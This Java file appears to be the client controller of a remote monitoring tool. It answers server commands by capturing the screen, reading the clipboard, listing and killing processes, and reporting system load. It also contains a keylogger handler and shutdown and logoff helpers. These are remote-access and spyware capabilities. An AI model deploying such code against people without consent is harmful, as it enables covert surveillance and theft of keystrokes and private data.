package controllers;

import client.Client;
import models.MessageModel;
import models.SystemInfoModel;
import org.json.JSONArray;
import utils.Helper;
import utils.JSON;
import utils.KeyLogger;
import utils.console;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Array;
import java.util.*;
import java.util.concurrent.Future;
import java.util.concurrent.TimeUnit;

import static utils.Command.*;
import static utils.Environment.DEFAULT_FROM;
import static utils.Environment.DEFAULT_SERVER_HOST;

public class Controller {
    private static SystemInfoModel si = new SystemInfoModel();

    private static Map<String, Executable<JSON>> controller = new HashMap();

    public static void init() {
        put(COMMAND_RAM, Controller::getMonitoring);
        put(COMMAND_MONITORING, Controller::getMonitoring);
        put(COMMAND_CLIPBOARD, Controller::getClipboard);
        put(COMMAND_CLIENT_SYSTEM_INFO, Controller::getClientSystemInfo);
        put(COMMAND_CLIENT_SCREEN, Controller::getScreen);
        put(COMMAND_PROCESS, Controller::getProcess);
        put(COMMAND_END_PROCESS, Controller::endProcess);
    }

    private static String endProcess(JSON input) {
        Integer pid = input.getInt("pid");
        long countdown = input.getLong("countdown");
        Client.getExecutorService().schedule(()->ProcessHandle.of(pid).ifPresent(ProcessHandle::destroy), countdown, TimeUnit.MINUTES);
        return new MessageModel(DEFAULT_FROM, DEFAULT_SERVER_HOST, COMMAND_NORMAL).json();
    }

    private static String getKeylogger(JSON input) {
        return new MessageModel(DEFAULT_FROM, DEFAULT_SERVER_HOST, COMMAND_KEYLOGGER).put("keylogger", KeyLogger.getLog()).json();
    }

    private static String getScreen(JSON input) {
        try {
            BufferedImage image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            ImageIO.write(image, "jpg", byteArrayOutputStream);
            byte[] tmp = byteArrayOutputStream.toByteArray();
            return new MessageModel(DEFAULT_FROM, DEFAULT_SERVER_HOST)
                    .put(COMMAND, COMMAND_CLIENT_SCREEN)
                    .put("image", new JSONArray(tmp))
                    .put("length", tmp.length)
                    .json();
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

    private static String getClipboard(JSON input) {
        return new MessageModel(DEFAULT_FROM, DEFAULT_SERVER_HOST, COMMAND_CLIPBOARD)
                .put("clipboard", si.getClipboard())
                .json();
    }

    private static String getMonitoring(JSON input) {
        return new MessageModel(DEFAULT_FROM, DEFAULT_SERVER_HOST, COMMAND_MONITORING)
                .put("ram", si.getMemoryLoadPercentage())
                .put("cpu", si.getProcessorLoadPercentage())
                .put("disk", si.getDriveLoadPercentage())
                .json();
    }

    private static String getClientSystemInfo(JSON input) {
        return new MessageModel(DEFAULT_FROM, DEFAULT_SERVER_HOST)
                .put(COMMAND, COMMAND_CLIENT_SYSTEM_INFO)
                .put("result", new JSON(si))
                .json();
    }

    private static String getNotFoundController(JSON input) {
        return new MessageModel("", DEFAULT_SERVER_HOST, "STATUS_MESSAGE_403").json();
    }

    private static void shutdown(JSON input) throws IOException {
        String shutdownCommand;
        String operatingSystem = System.getProperty("os.name");

        if ("Linux".equals(operatingSystem) || "Mac OS X".equals(operatingSystem)) {
            shutdownCommand = "shutdown -h now";
        }
        // This will work on any version of windows including version 11
        else if (operatingSystem.contains("Windows")) {
            shutdownCommand = "shutdown.exe -s -t 0";
        } else {
            throw new RuntimeException("Unsupported operating system.");
        }

        Runtime.getRuntime().exec(shutdownCommand);
        System.exit(0);
    }

    private static void killProcess(JSON input) throws IOException {
        String pid = "4432";
        Runtime.getRuntime().exec("taskkill /F /PID " + pid);
    }

    private static void logoff(JSON input) throws IOException {
        Runtime.getRuntime().exec("shutdown /L");
    }

    private static long getGigabytesByBytes(Long bytes) {
        return (long) (bytes / (1024 * 1024 * 1024));
    }

    public static String getPercentCpuUsage() {
        return Helper.CommandPrompt("wmic cpu get loadPercentage");
    }

    public static Executable get(String key) {
        return controller.getOrDefault(key, Controller::getNotFoundController);
    }

    public static Executable put(String key, Executable<JSON> value) {
        return controller.put(key, value);
    }

    private static String text(Optional<?> optional) {
        return optional.map(Object::toString).orElse("-");
    }

    private static String getProcess(JSON input) {
        JSONArray processes = new JSONArray();
        ProcessHandle.allProcesses()
                .filter(ph -> ph.parent().isPresent() && (ph.info().toString().length() > 2))
                .forEach(process -> {
                    String[] cmd = process.info().command().get().split("\\\\");
                    processes.put(new JSON().put("pid", process.pid()).put("cmd", cmd[cmd.length-1]));
                });
        return new MessageModel(DEFAULT_FROM, DEFAULT_SERVER_HOST, COMMAND_PROCESS).put("processes", processes).json();
    }
}
